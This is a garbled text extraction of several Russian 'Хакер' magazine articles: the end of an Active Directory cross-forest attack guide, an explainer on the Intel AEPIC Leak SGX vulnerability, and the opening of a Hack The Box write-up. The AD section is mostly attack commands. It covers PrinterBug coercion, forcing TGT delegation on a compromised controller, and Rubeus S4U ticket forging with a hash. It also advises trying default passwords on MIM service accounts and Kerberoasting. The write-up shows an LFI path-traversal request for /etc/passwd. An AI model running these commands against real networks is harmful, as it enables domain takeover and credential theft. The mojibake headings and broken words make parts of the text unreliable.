MS-RPRN.exe \\<атакуемый КД> \\<наш КД с неограниченным
делегированием>
MS-RPRN.exe \\dc01.megabank.local \\dc02.priv.local


Ìåæäó ëåñàìè
Здесь нас опять будут под жидать сюрпризы! Не так давно Microsoft озаботи-
лась этой проблемой. Сог ласись, как-то не очень хорошо, если хакеры ломают
малень кий лес ком пании mycra.local, а потом перебрасываются на боль -
шой — misha.local. Поэтому появился механизм TGT Delegation. Если очень
корот ко, то этот механизм предот вращает хождение кон троллера домена
со своим TGT в дру гой лес, поэтому его бесполезно триг герить с помощью
PrinterBug, PetitPotam или любым дру гим способом.
  Сначала требует ся обнаружить, включен ли TGT Delegation (вдруг еще не
все так плохо?):


netdom trust <атакуемый лес> /domain:<текущий лес> /
EnableTgtDelegation


# AD Module
Get-ADTrust -server <атакуемый лес> -Filter *
Get-ADTrust -Filter {Direction -eq "Inbound"} | ft Name,
TGTDelegation





Нам повезло — production.local исполь зует TGT Delegation. Значит, мы
можем триг герить кон троллер этого домена на наш кон троллер, хотя по умол-
чанию включена настройка TGTDelegation: False.





Поэтому КД домена megabank.local мы не сможем заставить сходить к нам.
   Так же если мы каким-то образом получили доступ с правами ДА/ЛА на ата-
куемом КД, то мы можем принудитель но включить TGT Delegation, что сделает
лес уязвимым:


netdom trust <текущий (атакуемый) лес> /domain:<лес, из которого
будем атаковать> /EnableTGTDelegation:Yes
netdom trust megabank.local /domain:priv.local /
EnableTGTDelegation:Yes

После не забудь отключить следующие фун кции:


netdom trust megabank.local /domain:priv.local /
EnableTGTDelegation:No


Îãðàíè÷åííîå äåëåãèðîâàíèå
С ограничен ным делегированием все достаточно просто. Сначала ищем нуж-
ные УЗ в дру гом домене/лесе:


# PowerView
    Get-DomainUser –TrustedToAuth -Domain eu.local
    Get-DomainComputer –TrustedToAuth -Domain eu.local


# AD Module
    Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -
Properties msDS-AllowedToDelegateTo -Server eu.local





Видим, что некоему storagesvc разрешено делегировать time/EU-DC.eu.
local. При этом, напоминаю, сервисная часть билета не под писывается.
Как следствие, мы можем изменить time на cifs или ldap:


Rubeus.exe s4u /user:<юзер с ограниченным делегированием> /rc4:<
хеш юзера с ограниченным делегированием> /impersonateuser:<чей
билет хотим получить> /domain:<атакуемый домен> /msdsspn:<сервис>/
<комп, на который разрешено делегирование> /altservice:<на какой
еще сервис хотим получить доступ> /dc:<dc атакуемого домена> /ptt


Rubeus.exe s4u /user:storagesvc /rc4:
5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /
domain:eu.local /msdsspn:cifs/eu-dc.eu.local /altservice:ldap /dc:
eu-dc.eu.local /ptt


PAM TRUST

Privileged Access Management был пред ставлен в Windows Server 2016. По мне-
нию Microsoft, он помогает «смяг чить проблемы безопасности в средах Active
Directory». Сейчас мы обратим ся к сайту Microsoft, разберем этот механизм,
а потом рассмот рим, как можно обойти ограничения.
  PAM пред ставляет собой дополнитель ный  лес администраторов  (лес
Bastion). К дан ному лесу настроено доверие PAM Trust от дру гого леса (лес
Corp). А управление ведет ся с помощью MIM (Microsoft Identity Management).
MIM создает дополнитель ные теневые прин ципалы безопасности (shadow
security principal) в лесе Bastion — это группы, поль зователи и компь ютеры,
которые сопоставляются с теми же группами, поль зователями и компь ютерами
в лесе Corp (то есть в лесе, который доверяет Bastion по PAM Trust). Это поз-
воляет управлять дру гими лесами без изменений в ACL и без интерак тивного
входа в систему.





Îáíàðóæåíèå
Обнаружить PAM-доверие несложно. Оно всег да односторон нее — к лесу
администраторов из обычного леса. Под обычным лесом я под разумеваю
просто какой-то лес, который управляется лесом администраторов. У такого
доверия в свойствах EnableSIDHistory и EnablePIMTrust указано значение
yes. Первое позволяет вставлять SID обычного леса в билеты леса админис-
траторов, второе — исполь зовать SID даже с высокими привилегиями (нап-
ример, Enterprise Admins). Благодаря этому автоматически обходит ся SID
Filtering.


Ïðîâåðêà, íå â áàñòèîííîì ëåñå ëè ìû
Если вдруг мы ском прометировали лес администраторов (Bastion), то мы так -
же сможем получить доступ ко всем обычным лесам, которы ми управляет этот
лес (в нашем примере это лес Corp).
  Мы можем проверить, не находим ся ли мы в лесе администраторов. У это-
го леса имеются следующие признаки: для доверия ForestTransitive уста-
новлено значение True, в SIDFilteringQuarantined — False (что означает,
что филь трация SID отключена), а так же у него есть нужные атрибуты доверия:


# AD Module
    Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (
SIDFilteringQuarantined -eq $False)}

Чтобы нам было проще отличить PAM Trust, рассмот рим два примера.





Здесь мы видим, что bastion.local имеет Outbound-доверие к techcorp.
local. То есть поль зователи techcorp.local могут получать доступ к ресур-
сам bastion.local. Это не PAM Trust. Это просто лес с тран зитивным довери-
ем и отключен ной филь трацией SID.
   Второй пример.





Здесь мы видим, что bastion.local имеет Inbound-доверие от production.
local. То есть поль зователи bastion.local могут получать доступ к ресурсам
production.local. Это уже похоже на PAM Trust. Вниматель ный читатель
спросит: «Миша, а что за атрибуты доверия?» Мы рассмот рим их позже.
   Чтобы быть уверен ными, что мы действитель но находим ся в бастион ном
лесе, мы должны попробовать перечислить shadow security principals.
Эти объекты создают ся в специаль ном кон тейнере. Если объекты  есть,
это значит, что наше пред положение верно:


# AD Module
    Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,
CN=Services," + (Get-ADRootDSE).configurationNamingContext) -
Filter * -Properties * | select Name,member,msDS-
ShadowPrincipalSid | fl





Вы вод на скрин шоте выше под тверждает наши догад ки. Мы видим, что
перед нами группа prodforest-ShadowEnterpriseAdmin, а участником этой
группы является поль зователь Administrator домена bastion.local. Но сто-
ит отметить, что членство в таких группах непостоян ное. Если вывод пуст, мы
должны время от времени проверять, какой поль зователь добавился в эту
группу. Так же можно обратить внимание на группу msDS-ShadowPrincipalSid.
Как мы видим, у этой группы rid 519, что соот ветству ет стан дартному RID
группы Enterprise Admins.


Ïðîâåðÿåì, íå óïðàâëÿåòñÿ ëè òåêóùèé ëåñ êàêèì-òî äðóãèì ïî
PAM Trust
Мы так же можем выяснить, управляется ли наш текущий лес бастион ным
лесом. Перечислим все трасты, которые могут быть похожи на PAM Trust:


# AD Module
    Get-ADTrust -Filter {(ForestTransitive -eq $True)}





Мы видим, что production.local имеет Outbound-доверие к bastion.local,
то есть доверяет ему. Теперь стоит обратить внимание на TrustAttributes.
  На PAM Trust будут указывать два значения:
 • 1024  (0x00000400 ) — доверие PAM  Trust и  External  Trust (внеш нее
   доверие);
 • 1096 — это и PAM Trust, и External Trust (внеш нее доверие), и Forest
    Transitive.

Так же PAM Trust всег да односторон ний (от обычного леса к лесу админов).
Если мы сом неваемся, PAM Trust ли это, то можем попробовать узнать ОС
кон троллеров домена леса, которому доверяет наш лес. Если это Windows
Server 2016 и выше, то возможен PAM Trust, если ниже, то абсолют но точно
нет.


Äîïîëíèòåëüíûå ïðîâåðêè è íîâûå óãðîçû
Если ты посмотрел в докумен тации Microsoft , как создавать PAM Trust, то, ско-
рее всего, заметил следующие коман ды:


import-module activedirectory
$sp = ConvertTo-SecureString "Pass@word1" –asplaintext –force
New-ADUser –SamAccountName MIMMA –name MIMMA
....

Этой коман дой создают ся дополнитель ные слу жебные поль зователи в лесе
администраторов, которые требуют ся для управления MIM.
   Если в домене присутству ет один из следующих поль зователей, это нам -
ного увеличивает шан сы того, что перед нами лес администраторов:


# PowerView
    # v2
    Get-NetUser -Domain priv.local


    # v3
    Get-DomainUser -Domain priv.local


# AD Module
    Get-ADUser -Filter * -Properties * -Server priv.local


MIMMA <- 100% лес админов
MIMMonitor <- 100% лес админов
MIMComponent <- 100% лес админов
MIMSync <- 100% лес админов
MIMService <- 100% лес админов <- Входит в группу ДА
MIMAdmin <- 100% лес админов
SharePoint <- Входит в группу ДА
SqlServer
BackupAdmin

Все эти учет ные записи стоит проверить с паролем Pass@word1. Так же, если
мы наш ли учет ки PRIV.pamRequestor или pamrequestor, имеет смысл поп-
робовать пароли L0ngP@ssw0rd и L0ngP@ssw0rd1. Ко всему прочему у всех
этих поль зователей настроен SPN, поэтому мы можем атаковать их с исполь -
зованием атаки Kerberoasting.





ÝÊÑÏËÓÀÒÀÖÈß

Чтобы злоупот ребить PAM Trust, мы должны получить поль зователя, который
входит в кон тейнер CN=Shadow  Principal  Configuration,CN=Services.
Сначала требует ся найти поль зователей из этого кон тейнера:


# AD Module
    Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,
CN=Services,DC=priv,DC=local" -Filter * -Properties * | select
Name,member,msDS-ShadowPrincipalSid | fl





Я уже рассказывал выше, что означает дан ный вывод. Как толь ко мы сможем
ском прометировать поль зователя из этого кон тейнера (member), получим дос-
туп, который имеет прин ципал,  указан ный в msDS-ShadowPrincipalSid.
В нашем примере это будет доступ, который имеют  участники группы
Enterpise Admins.
  Мы можем получить доступ к обычному лесу с помощью PowerShell, WMI
и дру гих подобных инстру мен тов без ввода учет ных дан ных. Для RDP нам при-
дет ся их вводить.
  Обрати  внимание:  если  шифрование  Kerberos  AES  не  включено
для доверия, нам нужно изменить свойство WSMan TrustedHosts и исполь -
зовать аутен тификацию Negotiate для PSRemoting:


# production.local — это управляемый лес. Мы находимся в
бастионном
Enter-PsSession dc.production.local -Authentication
NegotiateWithImplicitCredential

Дру гой вариант — исполь зовать SIDHistory (опция /sids в мимике). Доверие
PAM позволяет SID с высокими привилегиями пересекать доверие леса,
которое обычно филь тру ется с помощью SIDFiltering.


ÇÀÊËÞ×ÅÍÈÅ

Вот такой корот кой получилась статья. Я надеюсь, что смог достаточно понят -
ным язы ком рассказать о сложных кон цепциях. Если у тебя остались вопросы,
то смело задавай их мне в телег раме.
ВЗЛОМ





              ИЗУЧАЕМ НАШУМЕВШУЮ
     УЯЗВИМОСТЬ В ПРОЦЕССОРАХ INTEL




Прог рам мно эксплу ати руемая аппа рат ная
уяз вимость —  явление  ред кое. Обна -
                                                              Юрий Язевружить такую неп росто, а пофик сить —                                                                        Широко известен под
                                                                          псевдонимом yurembo.еще сложнее: если проблема скры вает ся                                                                              Программист, разработчик
                                                                                  видеоигр, независимыйв архи тек туре про цессора, она впол не                                                                                 исследователь. Старый
                                                                               автор журнала «Хакер».может ока заться и вов се неустра нимой.                                                                                   yazevsoft@gmail.com
Технология  Intel SGX уже неод нократ но
под верга лась ата кам, и вот недав но объ-
еди нен ная груп па исследова телей обна -
ружи ла в про цессорах Intel еще один архи -
тек турный  баг, поз воля ющий орга низо -   Валентин Холмогоров
вать утеч ку клю чей шиф рования и дру гой     valentin@holmogorov.ruВедущий редактор
кри тич ной информа ции.


Баг получил наименование AEPIC Leak . Давай разберем ся в его устройстве
и посмотрим, так ли он опасен, как об этом говорят.


×ÒÎ ÒÀÊÎÅ INTEL SGX?

Технологию SGX (Software Guard Extensions) называют краеуголь ным кам нем
системы безопасности процессоров Intel. По боль шому счету SGX пред став-
ляет собой набор инструк ций, позволяющих прог раммам, в частности опе-
рационным системам и виртуаль ным машинам, создавать так называемые
анклавы — защищен ные участки памяти для хранения ключей шифрования
и прочих критичных дан ных.
   Главная особен ность анклавов зак лючается в том, что, кроме процесса-вла-
дель ца, ни один дру гой процесс, включая ядро ОС, гипервизоры виртуаль ных
машин, периферийные устройства, обращающиеся к памяти с прямыми зап-
росами DMA, не имеют прав на чтение из защищен ной области памяти
и запись в нее. Это гаран тиру ет целостность хранящихся там дан ных.
   Теоретически нет никакой возможности изменить содержимое анклавов
SGX, даже если сама операционная система ском прометирована или в ней
работает вредоносное ПО с высокими привилегиями. С исполь зованием этого
инстру мен та можно организовать надежное шифрование дан ных (например,
для создания защищен ных дисковых разделов), выполнять безопасные уда-
лен ные вычисления, хранить цифровые сертификаты или реализовать системы
защиты от копирования —  так, SGX активно исполь зовался в технологии
записи дан ных Blu-ray. Изначаль но SGX создавался имен но для вычислений
на удален ных машинах в обособленном и полностью защищен ном окру жении.
   Технология SGX появилась в 2015 году в процессорах Intel шестого поколе-
ния Skylake. Имен но в эти чипы был встроен аппарат ный модуль Memory
Encryption Engine, обеспечивающий шифрование дан ных, которые передаются
от процессора в анклавы памяти SGX. Посколь ку шифрование выполнялось
ком понен том CPU, периметр безопасности ограничивался толь ко процес-
сором, без обмена незашифрован ными дан ными с оперативной памятью,
всег да считавшейся ненадежной в плане информацион ной безопасности.


ÁÐÅØÜ AEPIC LEAK

AEPIC Leak — первый архитек турный баг CPU, позволяющий атакующему сли-
вать дан ные из процессора без исполь зования сторон него канала. Такие уяз-
вимости, как Meltdown или Spectre, не являются полностью аппарат ными
багами. Они пред ставляют собой аппарат ные уязвимости, которые эксплу ати-
руют ся из прог рам много обеспечения. Следователь но, сторон ний канал —
это внеш нее ПО. Дру гими словами, брешь AEPIC Leak позволяет уводить дан -
ные напрямую, без исполь зования специаль ных прог рамм. Тем не менее, что-
бы создать эти дан ные, применяются специаль ные архитек турно зависимые
библиотеки Intel IPP и SGX. Атаки на уязвимости Meltdown и Spectre называ-
ются атаками переход ного исполнения из-за необходимости исполь зования
такого специаль ного софта.
  К чисто архитек турным багам так же относят ся широко известные уязвимос-
ти FDIV и F00F. Первая из них была обнаружена в оригиналь ных процессорах
Pentium и приводила к неверным резуль татам при делении чисел с плавающей
запятой с помощью инструк ции FDIV. Вторая же присутствовала в боль шем
числе моделей процессоров, включая всю линейку мик роархитек турного ряда
P5. Ошибка мог ла привести к останову процессора еще при заг рузке операци-
онной системы, а «лечили» это, обновляя ОС.
  Между тем в девяностые годы прош лого века, ког да были выявлены две
эти уязвимости, диапазон вычислений не распространялся даль ше локаль ного
компь ютера. Поэтому, хотя выявление этих багов наделало много шума,
умыш ленная их эксплу атация не создавала для поль зователей серь езных
проблем, особен но после выхода заплаток. В наше время картина выг лядит
иначе. Мир зависит от вычислений в облаках, а так как SGX — главный защит -
ный механизм удален ных вычислений, эксплу атация хакерами его уязвимости
наносит сок рушитель ный удар по кон фиден циаль ности дан ных.


Âûÿâëåíèå óÿçâèìîñòè





Исследователи просканировали адресное пространство ввода-вывода процес-
соров, базиру ющихся на мик роархитек туре Intel Sunny Cove. В резуль тате уда-
лось обнаружить, что не все регистры локаль ного APIC проинициализированы
должным образом. Дру гими словами, после выполнения операции чтения/
записи эти регистры не очищают ся и продолжают хранить старые значения,
которые исполь зовались в предыду щем вычислении.
  Посредством AEPIC Leak можно прочесть зарезервирован ную часть APIC-
регистров. APIC исполь зует суперочередь между L2 и LLC для передачи дан -
ных ядру процессора. Зарезервирован ная часть не перезаписы вает ся, что поз-
воляет хакеру прочесть устаревшие дан ные дру гого приложения.





Наиболее уязвимым участком передачи дан ных внут ри CPU, отку да можно утя-
нуть цен ную информацию, является суперочередь — буфер для передачи дан -
ных из кеша L2 в LLC и обратно. При наличии административных привилегий
в системе  это позволяет  похитить  хранящиеся  в  анклаве SGX дан ные
без исполь зования сложных схем.


Öåëè àòàêè
Уязвимости AEPIC Leak под вержены все процессоры Intel на базе архитек туры
Sunny Cove (такие как Ice Lake и Alder Lake), то есть клиент ские мик ропроцес-
соры 10, 11 и 12-го поколений, а так же серверные процессоры Xeon треть его
поколения.
  При этом сама Intel выкатила более широкий список процессоров, под -
вержен ных уязвимости AEPIC Leak, включающий Ice Lake Xeon-SP, Ice Lake D,
Gemini Lake, Ice Lake U, Y и Rocket Lake.
  Сведения о том, под вержены ли атакам на эту брешь процессоры фирмы
AMD, разнятся. Кто-то сообщает, что такие процессоры не имеют этой уяз-
вимости, дру гие утверждают, буд то атакам под вержены процессоры на архи-
тек турах Zen 1–3.
  Даниель Грусс (исследователь из группы Грацского технического универ-
ситета, опубликовавшей отчет об уязвимости) утверждает, что, посколь ку Apple
M1 (и, возможно, M2) построены на основе того же дизайна, что и Sunny Cove,
они тоже под вержены атакам на уязвимость AEPIC Leak.
   Хотя установлено, что наиболь шую опасность AEPIC Leak пред ставляет
для локаль ных систем, это не значит, что хакер не может на своем компь ютере
под готовить эксплу атирующую уязвимость малварь и под сунуть ее поль -
зователю, работающему на целевой системе. Останет ся заставить поль зовате-
ля запустить вредоносную прог рамму, а даль ше уже дело техники.
   Как все-таки работает уязвимость AEPIC Leak? Сейчас разберем ся.


ÍÅÌÍÎÃÎ ÒÅÎÐÈÈ

Современ ные  процессоры —  крайне  сложные  устройства,  состоящие
из набора логических элемен тов, управляемых собствен ным набором мик -
ропрог рамм. Один из них — расширен ный прог раммируемый кон троллер пре-
рываний (APIC), управляющий, как следует из его названия, прерываниями. Он
состоит из локаль ного APIC, интегрирован ного в каждое логическое ядро
и ответствен ного за обработ ку межпроцессорных прерываний, и внеш него
APIC, управляющего прерываниями ввода-вывода.
  В свою очередь, локаль ный APIC содержит так называемые регистры, пред -
назначен ные для управления его фун кциональ ностью или отображения сос-
тояния прерываний в системе. По умолчанию современ ные кон троллеры APIC
фун кционируют в режиме xAPIC, в котором каждый регистр пред ставляет
собой область размером 4 Кбайт в физическом адресном пространстве
памяти. Разные модели процессоров имеют разное количество APIC-регис-
тров: от 32 до 256.
  Процессоры Intel исполь зуют иерархическую систему памяти для кеширо-
вания дан ных на несколь ких уровнях. Кеш самого низкого уровня — наиболее
близкого к ядру процессора (L1) — предоставляет более быструю память, чем
кеши верхних уровней. Но этот кеш имеет неболь шой объем и исполь зует ся
для хранения дан ных, которые готовят ся для обработ ки процессором на сле-
дующем шаге. Так же в нем хранят ся дан ные, попут но выбранные из кеша вер-
хних уровней.
   Кеши более высоких уровней имеют боль ший объем, но отличают ся мень -
шим быстродействием. В архитек туре  Intel на самом низком уровне рас-
полагается кеш инструк ций (L1I) и дан ных (L1D), на втором уровне — локаль -
ный объединен ный кеш (L2). Кеш-память последнего уровня (Last Level Cache,
LLC или L3) обычно общая для всех физических ядер. В докумен тации Intel пос-
ледний уровень кеша именует ся LLC, посколь ку разные устройства имеют раз-
ное количество кешей. Так, если у вычислитель ных ядер цен траль ного процес-
сора по три уровня кеша, то видеояд ро имеет четыре уровня.
   Ког да процессору нужны дан ные, он пытается их найти сначала на ближай-
шем уровне. Таким образом, в первую очередь он ищет их в собствен ных
регистрах. Если там их нет, поиск продолжает ся на уровне L1. Если на этом
уровне нужных дан ных тоже нет, процессор создает буфер, с помощью которо-
го обращает ся на уровень L2, попут но записы вая в этот буфер найден ные дан -
ные или сведения о неудаче. Дан ные, изъятые из верхнего уровня, через
буфер записы вают ся на нижний и в итоге передаются процессору.
   Если на уровне L2 тоже нет искомых дан ных, процессор создает суперо-
чередь (superqueue) и через нее обращает ся на уровень L3, повторяя опе-
рации записи и логирования выполненных операций. Если же дан ных нет и на
уровне L3, процессор обращает ся к кон троллеру памяти, чтобы тот попытался
найти их в оперативной памяти.
   Этот кру говорот дан ных между уровнями памяти получил название «коль -
цевое соединение». Как мы уже знаем, дан ные в анклаве передаются толь ко
по уровням процессорного кеша. Имен но на него нацелены атаки, направлен -
ные на эксплу атацию уязвимости AEPIC Leak.


ÀÐÕÈÒÅÊÒÓÐÀ INTEL SGX

Технология Intel SGX в той или иной мере исполь зует все эти архитек турные
элемен ты.  Intel Software Guard Extension обеспечивает доверен ную среду
исполнения (Trusted Execution Environment) на процессорах с архитек турой x86-
64. Чтобы прог рам мное обеспечение мог ло доверять анклаву или анклав был
уверен, что его пытается прочесть или записать процесс-владелец, в архитек -
туре SGX предусмотрена процеду ра аттестации — криптографической провер-
ки под линности анклава. Различают локаль ную и удален ную аттестацию: первая
применяется для проверки анклавов на одной плат форме, вторая — при уда-
лен ных вычислениях.
  Во время создания анклава CPU собирает криптографические измерения
для запуска анклава и его сиг натуры в два измеритель ных регистра: MRSIGNER
и  MRENCLAVE.  Анклав  генерирует  под твержден ный  локаль ный  аттестат
для целевого анклава, исполь зуя инструк цию ereport. Этот аттестат может
быть криптографически проверен целевым анклавом с помощью ключа,
получен ного инструк цией egetkey.
  В свою очередь, SGX основан на более ран ней технологии от Intel EPID.
Алгоритм Enhanced privacy ID был разработан в 2008 году и до сих пор
исполь зует ся как часть механизма аттестации в доверен ных системах, таких
как SGX.
   Ан клавы SGX находят ся в виртуаль ном адресном пространстве, но их
физическая память под держивает ся защищен ным кешем страниц анклава
(Enclave Page Cache, EPC). Записи в EPC автоматически шифруют ся и при
необходимости  расшифровываются  механизмом  шифрования  памяти.
Информация из анклава недоступна для злоумыш ленников или вредоносных
прог рамм, так как находит ся в зашифрован ном состоянии. Если во время
работы анклава происходит сбой или прерывание, процессор инициирует
асин хрон ный выход из анклава (AEX), надежно сохраняя и очищая все регистры
процессора, где выполняет ся анклав, на момент прерывания в области сох-
ранения его состояния (SSA) внут ри EPC.
   Из-за  ограничен ного  размера EPC зашифрован ные  страницы  могут
перемещать ся в основную память и обратно без раскры тия их содержимого.
Ког да страница анклава перемещает ся из основной памяти обратно в EPC, ее
расшифровывают и криптографически проверяют, чтобы убедить ся, что ее
содержимое не было под делано или изменено. Однако при этом дан ные
в откры том виде попадают в кеш процессора. Выполнение анклавов может
быть начато толь ко из пред варитель но под готовленной точки входа с помощью
инструк ции eenter. Завершение выполнения — с исполь зованием инструк ции
eexit. Специаль ная инструк ция eresume восстанавливает выполнение анклава
из фрейма SSA.
  Системное ПО исполь зует инструк цию EWB для перемещения зашифрован -
ных страниц EPC из кеша в оперативную память. Ког да страница анклава
перемещает ся из оперативной памяти в кеш, исполь зует ся инструк ция ELDU.
Она расшифровывает и криптографически проверяет содержимое, чтобы
гаран тировать, что оно не было под делано.





Как ты уже знаешь, для обработ ки запросов к кешам процессора разных уров-
ней слу жат буферы. Исследователи установили, что в процессорах Intel суперо-
чередь исполь зует ся как времен ный буфер для хранения запросов APIC. Изу -
чение механизма работы APIC показало, что при инициализации буфера APIC
перезаписы вает нулями толь ко архитек турно определен ные части регистра
и оставляет неак туаль ные значения в зарезервирован ной его части. Ины ми
словами, при чтении неопределен ного диапазона регистров APIC из буфера
возвращают ся устаревшие дан ные, помещен ные туда дру гим процессом,
при этом чтение можно выполнить из Ring 0, то есть из операционной сис-
темы.





                 Утечка байтов в 64-байтовой строке кеша

Настало время вспом нить о том, что буфер APIC хранит ся в суперочереди,
а сама суперочередь отвечает за кеширование информации. Таким образом,
через эти регистры могут быть прочитаны любые дан ные, передаваемые меж-
ду L2 и кешем последнего уровня. В том числе и попавшие в кеш дан ные
из страниц анклава, хранящиеся там в откры том виде.


ÝÊÑÏËÓÀÒÀÖÈß

Для эксплу атации уязвимости AEPIC Leak исследователи пред ложили две тех-
ники: Cache Line Freezing и Enclave Shaking. Обе техники нацелены на получе-
ние из суперочереди значений регистров, состояния заг рузки памяти, а так же
кеширован ных страниц дан ных SGX-анклава. Уязвимость позволяет получить
дан ные, исполь зуемые в процессе шифрования дан ных и удален ной аттеста-
ции, ключи AES-NI и RSA из библиотек Intel IPP и Intel SGX в течение несколь ких
секунд. Атака c исполь зованием сочетания этих двух методов приводит к утеч-
ке дан ных из анклавов со скоростью 334,8 байт/с и коэффициентом успешнос-
ти 92,2%.
  Первый метод строится на получении строк состояния анклава (SSA) внут ри
EPC, ког да работа анклава прерывается и зашифрован ные страницы EPC
перемещают ся в основную память и обратно через буфер. Cache Line Freezing
позволяет злоумыш леннику точно выбирать получаемые из буфера номера
строк  кеш-памяти  и  таким  образом  кон тролировать  выборку  строк.
Без исполь зования этого метода пот ребовались бы дополнитель ные инстру -
мен ты, чтобы восстановить исходный порядок строк.
  Метод Enclave Shaking исполь зует возможности операционной системы
безопасно менять местами страницы анклава. Поперемен но меняя местами
эти страницы, атакующий перемещает по иерархии кеша хранящиеся в них
дан ные, что приводит к утечке значений даже без продолжения выполнения
анклава. Ины ми  словами,  злоумыш ленник может  сосредоточить ся либо
на области SSA для утечки дан ных, исполь зуемых в регистрах, либо на области
сек ретных дан ных анклава в состоянии покоя. Повторяя атаку для каждой стра-
ницы анклава, можно полностью восстановить дамп памяти анклава и получить
доступ к хранящим ся в нем сек ретным дан ным.
   Лучший резуль тат достигается, если ком бинировать обе атаки.


ÍÀÑÊÎËÜÊÎ ÝÒÎ ÎÏÀÑÍÎ?

Ком пания Intel прек ратила под держивать SGX в процессорах Core 11-го и 12-
го поколений. Не вполне ясна ситу ация с процессорами от дру гих вен доров:
AMD и Apple. Тем не менее уже выпущен ные процессоры, работающие
под управлением ПО без над лежащего обновления, по-прежнему уязвимы.
Так же до сих пор уязвимость содержится в серверных процессорах Xeon треть -
его поколения, в них Intel пока не отключила SGX.
   Для работы эксплу атирующей AEPIC Leak малвари требуют ся администра-
тивные привилегии. Поэтому, если операционная система настроена правиль -
но и злоумыш ленник не имеет доступа к учет ной записи администратора, он
не сможет восполь зовать ся уязвимостью. Однако, как было сказано выше,
если под сунуть привилегирован ному юзеру эксплу атирующую эту уязвимость
прог рамму, то атака может быть успешна.
   Что же касается гипервизоров, то процессоры Intel не раскры вают локаль -
ные регистры APIC для виртуаль ных машин, что устраняет угрозу гостевым
системам. Тем не менее эксплу атация AEPIC Leak на «реаль ном железе»
может привести к утечке дан ных из анклавов SGX, работающих на физическом
ядре процессора. Это, в свою очередь, откры вает злоумыш ленникам доступ
к сек ретам DRM, ключам аттестации SGX, раскры вает AES-шифры и ставит
под угрозу безопасность удален ных вычислений.
  По боль шому счету уязвимость AEPIC Leak полностью разрушает гаран тии
безопасности, дек ларирован ные Intel для SGX, делая эту технологию прак -
тически бесполезной. Недаром Intel прек ратила ее развитие и даль нейшую
реализацию в новых процессорах.


ÊÀÊ ÎÁÅÇÎÏÀÑÈÒÜ ÑÂÎÈ ÄÀÍÍÛÅ?

Независимые эксперты, а  так же сама корпорация  Intel пред лагают ряд
решений, которые позволяют обезопасить дан ные от уязвимости AEPIC Leak.
 1. Îòêëþ ÷èòü SGX. Без нее отсутству ют возможности эксплу атации уяз-
   вимости. Но это не вариант для систем, где SGX активно исполь зует ся.
 2. Â îïåðàöè îííîé ñèñòåìå âêëþ ÷èòü ðåæèì x2APIC. Это позволит
   непосредствен ным образом отключить устаревший режим xAPIC. Главное
   отличие между xAPIC и x2APIC состоит в том, что последний не отображает
   на память регистры ввода-вывода, в первую очередь в целях повышения
   производитель ности. Посколь ку x2APIC ничего не проецирует в память,
   украсть дан ные становит ся невозможно.
 3. Èñïîëüçîâàòü îáíîâëåí íûé SGX SDK. По заверениям пред ставите-
   лей Intel, исполь зование нового SDK снижает риск атак на брешь AEPIC
   Leak до миниму ма.
 4. Äîæ äàòüñÿ îáíîâëåíèÿ ìèêðîêîäà. Intel может обновить мик рокод
   в драйверах к своим устройствам или добавить его в качестве модулей опе-
   рационной системы.
 5. Äîæ äàòüñÿ âûõîäà íîâûõ ïðîöåññîðîâ, в которых аппарат ная ошиб-
   ка будет устранена.

Последние два варианта растянуты во времени на неопределен ный срок. Тем
не менее своевремен ное обновление ПО и аппарат ной кон фигурации поз-
воляет повысить безопасность системы и избежать утечки критически важных
дан ных.
ВЗЛОМ





        ПИШЕМ ЭКСПЛОИТ
         ROP + MPROTECT
    И ИСПОЛЬЗУЕМ ПЕРЕПОЛНЕНИЕ
              БУФЕРА



В этом рай тапе мы раскру тим уяз вимость
локального   вклю чения  фай лов,   что
поможет нам при написа нии экспло ита
на осно ве ROP + mprotect. Поборов про -
вер ку лицен зии, мы повысим при вилегии             RalfHacker                                                                                          hackerralf8@gmail.com
при помощи  рут кита  binfmt_misc. Пре-
пари ровать будем машину Retired с пло -
щад ки Hack The Box. Задач ка классифици -
рова на как сложная, хотя я бы так не ска -
зал.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.154    retired.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

Что же мы наш ли? Порт 22 — служба OpenSSH 8.4p1, порт 80 — веб-сервер
Nginx. Так же из резуль татов скана Nmap видим редирект, в котором страница
передается в качестве парамет ра.





                         Главная страница сайта


ÒÎ×ÊÀ ÂÕÎÄÀ
LFI
При таком запросе страниц сайта нужно сразу проверить, получит ся ли отоб-
разить не тот файл, который был вставлен разработ чиком. Попробу ем зап-
росить /etc/passwd, восполь зовавшись обходом каталогов.


curl 'http://retired.htb/index.php?page=/../../../../../../../etc/
passwd'





                 Содержимое файла /etc/passwd

Уязвимость под тверждена, поэтому перейдем к эксплу атации. Нам нужно
знать, какие файлы читать, поэтому поищем на сайте скры тые страницы. Так
как мы уже столкну лись с форматами PHP и HTML, то такие страницы и будем
искать. Для этого восполь зуем ся сканером ffuf.




Од но из первых действий при тестировании безопасности веб-приложения —
это  сканирование методом  перебора  каталогов,  чтобы  найти  скры тую
информацию и недоступные обычным посетителям фун кции. Для этого можно
исполь зовать прог раммы вроде dirsearch и DIRB.
  Я пред почитаю лег кий и очень быстрый ﬀuf . При запуске указываем сле-
дующие парамет ры:
 • -w — словарь (я исполь зую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из резуль тата ответы с кодом 403.



Коман да следующая:


ffuf -u 'http://retired.htb/FUZZ.php' -t 256 -w directory_2.3_
medium_lowercase.txt



